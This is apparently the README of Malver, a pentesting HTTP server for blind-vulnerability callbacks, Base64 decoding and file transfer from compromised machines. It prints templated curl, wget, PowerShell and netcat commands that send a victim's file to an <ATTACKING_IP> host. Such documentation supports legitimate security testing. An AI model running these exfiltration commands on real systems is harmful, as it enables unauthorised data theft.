# Malver - **Mal**icious Ser**ver** for Pentesting & Bug Bounty

## Overview

Malver (**Mal**icious Ser**ver**) is a lightweight HTTP server designed to simplify common tasks in penetration testing and bug bounty hunting. It allows security researchers to efficiently decode Base64 data, validate blind vulnerabilities, and transfer files to and from a compromised system.



## Features

- Base64 Decoding – Quickly decode attacker-controlled data.
- File Transfer – Upload/download files in engagements.
- Blind Vulnerability Testing – Use `/` to validate SSRF, RCE, or command injection.
- Configurable – Customize endpoint paths and directories via CLI.
- Logging – Outputs structured logs for tracking interactions.
- Upload Command Generator – Automatically generate ready-to-use upload commands for upload feature.



## Endpoints

| Method | Endpoint | Description |
| ---- | ---- | ---- |
| GET | `/` | Used to validate blind vulnerabilities by sending a request.|
| GET | `/down/{filename}` | Downloads a file from the victim’s machine.|
| POST | `/up` | Uploads a file from the victim’s machine to the attacker's system.|
| GET | `/b64d?d=<encoded>` | Decodes Base64-encoded query data.|



## Installation

Ensure you have Go installed, then run:

```bash
go install github.com/omarelshopky/malver/cmd/malver@latest
```

This will install the malver binary in your Go bin directory.



## Usage

```bash
malver [-headers] [-port=3000] [-upload=./uploads] [-download=./downloads] [-ping-endpoint=/] [-down-endpoint=/down] [-up-endpoint=/up] [-b64d-endpoint=/b64d]
```



## Command-Line Flags

| Flag | Default | Description |
| ---- | ---- | ---- |
| `-headers` | `false` | Log request headers |
| `-port` | `3000` | Port to run the HTTP server on |
| `-upload` | `./uploads` | Directory for file uploads |
| `-download` | `./downloads` | Directory for file downloads |
| `-ping-endpoint` | `/` | Endpoint for ping |
| `-down-endpoint` | `/down/` | Endpoint for file downloads |
| `-up-endpoint` | `/up` | Endpoint for file uploads |
| `-b64d-endpoint` | `/b64d` | Endpoint for base64 decoding |
| `-upload-cmds` | `false` | Generate ready-to-use upload commands |
| `-ip` | `<ATTACKING_IP>` | Specify the attacker's IP address (used with -upload-commands) |
| `-file` | `<FILE_PATH>` | Specify the full path of the file to be uploaded (used with -upload-commands) |



## Example Use Cases

- Send a request to `/` and check if the target system can reach back.
- Extract and decode data sent from an exploited machine using `/b64d?q=<encoded>`
- Retrieving files from a compromised machine using `/down/{filename}` to download files.
- Upload a shell or tool using the `/up` endpoint. Use `-upload-commands` to generate pre-configured upload commands that can be executed on the victim machine using various built-in tools.




### Generating Upload Commands

To quickly generate ready-to-use upload commands, use:

```bash
malver -upload-commands -ip <ATTACKING_IP> -file <FILE_PATH>
```

Example output:

> cURL (Multipart Upload)

```bash
curl -X POST http://<ATTACKING_IP>:3000/up -F "file=@<FILE_PATH>"
```

> cURL (Raw Binary Upload)

```bash
curl -X POST --data-binary "@<FILE_PATH>" http://<ATTACKING_IP>:3000/up -H "Filename: <FILE_PATH>"
```

> wget

```bash
wget --method=POST --body-file=<FILE_PATH> --header="Filename: <FILE_PATH>" --header="Content-Type: application/octet-stream" "http://<ATTACKING_IP>:3000/up"
```

> Invoke-WebRequest (PowerShell)

```powershell
Invoke-WebRequest -Uri "http://<ATTACKING_IP>:3000/up" -Method Post -InFile "<FILE_PATH>" -ContentType "application/octet-stream" -Headers @{"Filename"="<FILE_PATH>"}
```

> Invoke-RestMethod (PowerShell)

```powershell
Invoke-RestMethod -Uri "http://<ATTACKING_IP>:3000/up" -Method Post -InFile "<FILE_PATH>" -ContentType "application/octet-stream" -Headers @{"Filename"="<FILE_PATH>"}
```

> netcat (nc)

```bash
(echo -en "POST /up HTTP/1.1\r\nHost: <ATTACKING_IP>:3000\r\nContent-Length: $(wc -c < <FILE_PATH>)\r\nFilename: <FILE_PATH>\r\nContent-Type: application/octet-stream\r\n\r\n"; cat <FILE_PATH>) | nc <ATTACKING_IP> 3000
```



## Logging

All requests are logged in the following format:

```bash
<DATE> <TIME> <CLIENT_IP>:<CLIENT_PORT> "<METHOD> <ENDPOINT><QUERY_PARAMS> HTTP/<HTTP_VERSION>" <STATUS_CODE> - [<POST_DATA>] <ENDPOINT_SPECIFIC_MESSAGE>
```

This helps track interactions with the server, including query parameters, POST data, and decoded Base64 content.



## Disclaimer

Malver is intended for legal penetration testing and security research only. Unauthorized use of this tool against systems without explicit permission is illegal and unethical. The author is not responsible for any misuse.
